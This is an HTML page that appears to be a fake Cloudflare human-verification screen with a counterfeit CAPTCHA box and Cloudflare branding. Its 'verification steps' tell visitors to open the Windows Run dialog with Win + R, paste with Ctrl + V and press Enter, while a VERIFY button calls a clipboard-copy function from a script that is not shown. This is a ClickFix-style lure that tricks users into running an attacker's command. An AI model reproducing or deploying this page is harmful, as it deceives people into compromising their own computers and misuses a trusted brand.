<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Just a moment...</title>
    <link rel="icon" href="https://www.cloudflare.com/favicon.ico">
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <h1 class="title">Just a moment...</h1>
        <p class="subtitle">Verifying you are human. This may take a few seconds.</p>

        <!-- Cloudflare CAPTCHA Box (Correct Left Alignment) -->
        <div class="captcha-container">
            <label class="captcha-label">
                <input type="checkbox" id="captchaCheckbox">
                <span class="captcha-box"></span>
                <span class="captcha-text">Verify you are human</span>
            </label>
            <img src="https://www.cloudflare.com/img/logo-cloudflare-dark.svg" class="cloudflare-logo">
        </div>

        <!-- Spinner (Now Correct Cloudflare Animation) -->
        <div class="spinner-container" id="loadingSpinner">
            <div class="spinner"></div>
            <p class="verifying-text">Verifying...</p>
        </div>

        <!-- Verification Box (Now Fully Styled & Aligned) -->
        <div class="verification-box" id="verificationBox">
            <strong>Security by Cloudflare</strong>
            <p>Verification steps:</p>
            <ol>
                <li>Press & hold <strong>Win + R</strong></li>
                <li>Press <strong>Ctrl + V</strong> in the verification window</li>
                <li>Press <strong>Enter</strong></li>
            </ol>
            <p><strong>Verification ID:</strong> <span id="rayID"></span></p>
            <button class="verify-btn" onclick="copyRayID()">VERIFY</button>
        </div>

        <!-- Cloudflare Footer -->
        <p class="ray-id">Ray ID: <span id="footerRayID"></span></p>
        <p class="footer">
            <a href="https://www.cloudflare.com/privacypolicy/" target="_blank">Privacy</a> â€¢ 
            <a href="https://www.cloudflare.com/en-us/website-terms/" target="_blank">Terms</a>
        </p>
    </div>

    <script src="script.js"></script>
</body>
</html>
